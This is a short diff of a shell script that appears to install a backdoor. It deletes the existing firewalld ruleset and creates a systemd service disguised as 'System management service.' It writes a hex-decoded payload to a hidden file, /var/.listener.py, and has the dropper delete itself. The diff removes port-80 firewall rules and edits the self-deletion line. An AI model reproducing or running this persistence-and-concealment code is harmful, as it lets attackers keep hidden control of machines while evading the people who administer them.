@@ -9,10 +9,6 @@ nft delete table inet firewalld
 nft add table firewall
 nft add chain firewall vIn \{ type filter hook input priority -101 \; policy accept\; \}
 nft add chain firewall vOut \{ type filter hook output priority -101 \; policy accept\; \}
-nft add rule firewall vIn tcp dport { 80 } accept
-nft add rule firewall vIn tcp sport { 80 } accept
-nft add rule firewall vOut tcp dport { 80 } accept
-nft add rule firewall vOut tcp sport { 80 } accept
 cat <<EOFA > /etc/systemd/system/systemb.service
 [Unit]
 Description=System management service.
@@ -36,7 +32,7 @@ def main():
 	package = bytes.fromhex(sys.argv[1]).decode('utf-8')
 	os.system('echo "' + package + '" > /var/.listener.py')
 	self = sys.argv[0]
-	os.system(f"rm {self}")
+	os.system("rm " + self)
 main()
 EOFA
 python3 /tmp/test.py $1
